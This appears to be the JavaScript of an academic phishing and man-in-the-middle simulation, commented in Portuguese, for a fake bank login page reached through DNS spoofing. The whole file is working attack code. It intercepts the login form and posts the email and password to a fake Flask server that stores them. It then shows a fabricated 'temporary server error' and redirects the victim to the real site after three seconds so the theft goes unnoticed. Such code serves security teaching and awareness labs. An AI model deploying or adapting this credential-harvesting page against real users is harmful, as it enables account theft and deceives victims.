/* ============================================
   SIMULAÇÃO ACADÊMICA - SEGURANÇA DA INFORMAÇÃO
   JavaScript Principal — VERSÃO FAKE

   DIFERENÇAS EM RELAÇÃO AO SCRIPT ORIGINAL:
   ==========================================
   1. Após o envio do formulário ao servidor Flask fake,
      uma MENSAGEM DE ERRO genérica é exibida.
   2. Após um breve delay, o usuário é REDIRECIONADO
      automaticamente para o site LEGÍTIMO.
   3. Isso simula o comportamento de um ataque MITM real.

   FLUXO COMPLETO:
   ================
   [Vítima acessa site fake via DNS Spoofing]
     → Digita e-mail e senha
     → Dados enviados ao servidor Flask fake (POST /login)
     → Servidor fake armazena no SQLite
     → Servidor retorna JSON com URL do site legítimo
     → Script exibe "Erro temporário no servidor..."
     → Após 3 segundos, redireciona para o site legítimo
     → Vítima vê o site real e tenta novamente
     → Login funciona normalmente (no site legítimo)
   ============================================ */

// ============================================
// CONFIGURAÇÃO — URL DO SITE LEGÍTIMO
// ============================================
// IMPORTANTE: Altere este valor para o IP correto do
// servidor legítimo no seu ambiente de teste.
//
// Exemplos:
//   'http://192.168.1.100'     (IP na rede local)
//   'http://10.0.0.5'          (IP em rede virtual)
//   'http://securebank.local'  (se usar DNS local)
// ============================================
const LEGITIMATE_SITE_URL = 'http://192.168.1.100';

// --- Page Loader ---
// Remove a animação de carregamento (idêntico ao original)
document.addEventListener('DOMContentLoaded', () => {
  const loader = document.querySelector('.page-loader');
  if (loader) {
    setTimeout(() => {
      loader.classList.add('hidden');
      setTimeout(() => loader.remove(), 500);
    }, 600);
  }
});

// --- LOGIN PAGE LOGIC (FAKE) ---
function initLoginPage() {
  const form = document.getElementById('loginForm');
  const usuarioInput = document.getElementById('usuario');
  const senhaInput = document.getElementById('senha');
  const loginBtn = document.getElementById('loginBtn');
  const errorBanner = document.getElementById('errorBanner');

  if (!form) return;

  // Limpa erros ao digitar (idêntico ao original)
  [usuarioInput, senhaInput].forEach(input => {
    input.addEventListener('input', () => {
      input.closest('.form-group').classList.remove('error');
      if (errorBanner) errorBanner.style.display = 'none';
    });

    input.addEventListener('focus', () => {
      input.closest('.form-group').classList.remove('error');
    });
  });

  // ============================================
  // INTERCEPTAÇÃO DO FORMULÁRIO (FAKE)
  // ============================================
  // Usa fetch() em vez de form.submit() para:
  // 1. Capturar dados sem sair da página
  // 2. Exibir mensagem de erro genérica
  // 3. Redirecionar para o site legítimo após delay
  // ============================================
  form.addEventListener('submit', (e) => {
    e.preventDefault();

    let hasError = false;

    // Validação client-side (idêntica ao original)
    if (!usuarioInput.value.trim()) {
      usuarioInput.closest('.form-group').classList.add('error');
      hasError = true;
    }

    if (!senhaInput.value.trim()) {
      senhaInput.closest('.form-group').classList.add('error');
      hasError = true;
    }

    if (hasError) return;

    // Animação de loading (idêntica ao original)
    loginBtn.classList.add('loading');
    loginBtn.disabled = true;

    // ============================================
    // ENVIO VIA FETCH (CAPTURA MITM)
    // ============================================
    // Envia credenciais ao servidor Flask fake.
    // O servidor armazena no SQLite e retorna JSON
    // com a URL de redirecionamento.
    // ============================================
    const formData = new FormData(form);

    fetch('/login', {
      method: 'POST',
      body: formData
    })
    .then(response => response.json())
    .then(data => {
      // ============================================
      // EXIBIÇÃO DA MENSAGEM DE ERRO FAKE
      // ============================================
      // Após captura bem-sucedida, exibe "erro temporário"
      // para justificar o redirecionamento ao site legítimo.
      // ============================================
      loginBtn.classList.remove('loading');
      loginBtn.disabled = false;

      if (errorBanner) {
        errorBanner.style.display = 'flex';
      }

      const redirectUrl = data.redirect_url || LEGITIMATE_SITE_URL;

      // Redireciona após 3 segundos
      setTimeout(() => {
        window.location.href = redirectUrl;
      }, 3000);
    })
    .catch(error => {
      console.error('[MITM Simulação] Erro na requisição:', error);

      loginBtn.classList.remove('loading');
      loginBtn.disabled = false;

      if (errorBanner) {
        errorBanner.style.display = 'flex';
      }

      setTimeout(() => {
        window.location.href = LEGITIMATE_SITE_URL;
      }, 3000);
    });
  });
}

// --- Handler para "Esqueci minha senha" ---
function handleForgotPassword(e) {
  e.preventDefault();
  alert('Um link de recuperação foi enviado para o seu e-mail cadastrado.');
}

// --- Inicializa a lógica ---
document.addEventListener('DOMContentLoaded', () => {
  initLoginPage();
});
